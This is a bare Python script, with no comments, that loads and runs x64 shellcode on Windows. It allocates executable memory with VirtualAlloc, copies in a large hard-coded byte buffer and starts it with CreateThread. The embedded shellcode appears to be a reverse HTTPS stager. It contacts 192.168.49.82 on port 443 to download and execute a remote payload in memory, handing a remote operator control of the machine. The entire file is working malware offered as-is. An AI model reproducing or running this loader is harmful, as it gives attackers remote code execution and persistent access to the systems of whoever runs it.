import ctypes
import time
import sys

kernel32 = ctypes.windll.kernel32
time.sleep(1)

kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = kernel32.VirtualAlloc(None, 0x2000, 0x3000, 0x40)

buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41"
buf += b"\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48\x8b"
buf += b"\x52\x18\x48\x8b\x52\x20\x56\x4d\x31\xc9\x48\x0f\xb7"
buf += b"\x4a\x4a\x48\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x41\x51\x66"
buf += b"\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80"
buf += b"\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x44"
buf += b"\x8b\x40\x20\x50\x8b\x48\x18\x49\x01\xd0\xe3\x56\x4d"
buf += b"\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48"
buf += b"\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75"
buf += b"\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
buf += b"\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
buf += b"\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59\x41\x5a\x48"
buf += b"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
buf += b"\x12\xe9\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe"
buf += b"\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1"
buf += b"\x49\xc7\xc2\x4c\x77\x26\x07\xff\xd5\x53\x53\x48\x89"
buf += b"\xe1\x53\x5a\x4d\x31\xc0\x4d\x31\xc9\x53\x53\x49\xba"
buf += b"\x3a\x56\x79\xa7\x00\x00\x00\x00\xff\xd5\xe8\x0e\x00"
buf += b"\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x34\x39\x2e"
buf += b"\x38\x32\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xbb\x01\x00"
buf += b"\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89"
buf += b"\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8\xde\x00\x00\x00"
buf += b"\x2f\x48\x41\x41\x31\x67\x6c\x47\x6b\x77\x4d\x73\x51"
buf += b"\x4e\x68\x45\x30\x63\x2d\x57\x31\x43\x77\x71\x79\x64"
buf += b"\x57\x73\x41\x69\x5a\x71\x78\x65\x56\x69\x64\x6b\x44"
buf += b"\x5f\x6c\x4a\x76\x78\x54\x75\x2d\x69\x2d\x37\x7a\x44"
buf += b"\x6b\x4f\x36\x34\x4f\x67\x45\x39\x68\x36\x32\x38\x39"
buf += b"\x46\x64\x49\x49\x66\x77\x6d\x37\x7a\x61\x54\x5f\x73"
buf += b"\x4a\x70\x62\x58\x48\x55\x65\x32\x66\x74\x76\x74\x35"
buf += b"\x30\x42\x5f\x76\x69\x4d\x37\x69\x2d\x5a\x51\x5f\x7a"
buf += b"\x6c\x37\x6b\x33\x73\x32\x79\x6c\x2d\x47\x75\x44\x68"
buf += b"\x68\x36\x76\x56\x41\x6b\x68\x58\x50\x35\x49\x48\x41"
buf += b"\x5f\x53\x76\x71\x64\x49\x41\x41\x46\x58\x62\x43\x31"
buf += b"\x69\x58\x34\x66\x41\x32\x49\x41\x6f\x6d\x44\x49\x58"
buf += b"\x46\x74\x6e\x4b\x79\x64\x44\x56\x58\x2d\x44\x35\x49"
buf += b"\x37\x44\x6d\x64\x4e\x50\x66\x4e\x39\x30\x51\x6d\x68"
buf += b"\x73\x30\x62\x6c\x71\x71\x6d\x70\x35\x51\x47\x6d\x34"
buf += b"\x49\x6d\x72\x70\x6d\x55\x75\x7a\x41\x66\x73\x4b\x77"
buf += b"\x53\x33\x4f\x5a\x33\x76\x43\x70\x70\x39\x70\x54\x56"
buf += b"\x00\x48\x89\xc1\x53\x5a\x41\x58\x4d\x31\xc9\x53\x48"
buf += b"\xb8\x00\x32\xa8\x84\x00\x00\x00\x00\x50\x53\x53\x49"
buf += b"\xc7\xc2\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a"
buf += b"\x5f\x48\x89\xf1\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00"
buf += b"\x49\x89\xe0\x6a\x04\x41\x59\x49\xba\x75\x46\x9e\x86"
buf += b"\x00\x00\x00\x00\xff\xd5\x4d\x31\xc0\x53\x5a\x48\x89"
buf += b"\xf1\x4d\x31\xc9\x4d\x31\xc9\x53\x53\x49\xc7\xc2\x2d"
buf += b"\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1f\x48\xc7\xc1\x88"
buf += b"\x13\x00\x00\x49\xba\x44\xf0\x35\xe0\x00\x00\x00\x00"
buf += b"\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8\x55\x00\x00"
buf += b"\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49"
buf += b"\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00"
buf += b"\x00\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48"
buf += b"\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00\x00\x49"
buf += b"\x89\xf9\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff"
buf += b"\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb2\x66\x8b\x07\x48"
buf += b"\x01\xc3\x85\xc0\x75\xd2\x58\xc3\x58\x6a\x00\x59\x49"
buf += b"\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5"


kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
kernel32.RtlMoveMemory(ptr, buf, len(buf))

time.sleep(2)

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
